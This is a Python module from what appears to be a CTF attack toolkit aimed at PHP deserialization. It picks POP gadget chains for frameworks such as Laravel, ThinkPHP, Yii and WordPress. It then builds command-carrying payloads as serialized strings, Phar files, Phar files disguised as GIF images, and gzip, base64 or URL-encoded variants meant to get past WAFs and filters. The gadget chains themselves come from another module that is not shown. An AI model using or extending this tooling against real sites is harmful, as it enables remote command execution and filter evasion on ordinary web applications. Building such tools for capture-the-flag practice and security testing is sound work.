"""PHP deserialization attack framework for CTF.

POP chain selection, serialized payload generation, Phar file creation,
and encoding layers for bypassing WAF/filters.
"""
from __future__ import annotations

import base64
import io
import gzip
from typing import TYPE_CHECKING, Any, Dict, List, Optional

from .pop_chains import ALL_CHAINS, POPChain, build_phar  # noqa: F401 — re-exported

if TYPE_CHECKING:
    from .workspace_cleaner import WorkspaceCleaner

# ---------------------------------------------------------------------------
# POPChainSelector
# ---------------------------------------------------------------------------

FRAMEWORK_KEYWORDS: Dict[str, List[str]] = {
    "ThinkPHP": ["thinkphp", "think\\", "think", "thinkphp5", "thinkphp6", "thinkphp 5", "thinkphp 6"],
    "Laravel": ["laravel", "illuminate\\", "laravel/framework"],
    "Yii": ["yiisoft", "yii\\", "yii2", "yii/base"],
    "Laminas": ["laminas\\", "laminas/", "zend\\", "zend/"],
    "Symfony": ["symfony\\", "symfony/"],
    "CodeIgniter": ["codeigniter", "ci_"],
    "WordPress": ["wordpress", "wp_"],
}


class POPChainSelector:
    """Select the right POP chain based on framework and available classes."""

    def __init__(self) -> None:
        self._chains = ALL_CHAINS

    def select(
        self,
        framework: str = "",
        available_classes: Optional[List[str]] = None,
        source_text: str = "",
    ) -> List[POPChain]:
        """Return matching POP chains ordered by likelihood."""
        scores: List[tuple] = []
        for chain in self._chains:
            score = 0
            lc_text = source_text.lower()
            fw = framework.lower()

            # Framework match
            if fw and chain.framework.lower() in fw:
                score += 10
            else:
                for fw_name, keywords in FRAMEWORK_KEYWORDS.items():
                    if chain.framework == fw_name:
                        for kw in keywords:
                            if kw in lc_text:
                                score += 8
                                break

            # Class match
            if available_classes:
                matched = sum(1 for c in chain.gadget_classes if c in available_classes)
                score += matched * 5

            # Generic chains get lower priority
            if chain.framework == "Generic":
                score += 1

            scores.append((score, chain))

        scores.sort(key=lambda x: x[0], reverse=True)
        top_score = scores[0][0] if scores else 0
        if top_score > 0:
            return [chain for score, chain in scores if score >= max(1, top_score - 3)]
        return [chain for score, chain in scores[:3]]

    def list_all(self) -> List[POPChain]:
        return list(self._chains)


# ---------------------------------------------------------------------------
# PayloadGenerator - encoding layers
# ---------------------------------------------------------------------------

class PayloadGenerator:
    """Generate and encode PHP deserialization payloads."""

    def __init__(self, cleaner: "Optional[WorkspaceCleaner]" = None):
        self._cleaner = cleaner

    def serialize_payload(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        return chain.generate_serialize(command)

    def phar_payload(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        phar_bytes = chain.generate_phar(command)
        # Track generated phar for cleanup
        if self._cleaner:
            self._cleaner.create_temp_file("payload.phar", phar_bytes)
        return phar_bytes

    def phar_as_image(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        phar_bytes = chain.generate_phar_as_image(command)
        if self._cleaner:
            self._cleaner.create_temp_file("payload.gif", phar_bytes)
        return phar_bytes

    def gzip_payload(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        raw = chain.generate_serialize(command)
        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb") as gf:
            gf.write(raw)
        return buf.getvalue()

    def base64_payload(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        return base64.b64encode(chain.generate_serialize(command))

    def urlencode_payload(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        from urllib.parse import urlencode
        raw = chain.generate_serialize(command)
        return urlencode({"data": raw}).encode()

    def phar_gzip(self, chain: POPChain, command: str = "cat /flag") -> bytes:
        phar = chain.generate_phar(command)
        buf = io.BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb") as gf:
            gf.write(phar)
        return buf.getvalue()


# ---------------------------------------------------------------------------
# Quick pop utility
# ---------------------------------------------------------------------------

def quick_pop_payload(framework: str, command: str = "cat /flag") -> Optional[bytes]:
    """Quick POP payload generation without needing a selector."""
    selector = POPChainSelector()
    chains = selector.select(framework=framework)
    if chains:
        return chains[0].generate_serialize(command)
    return None
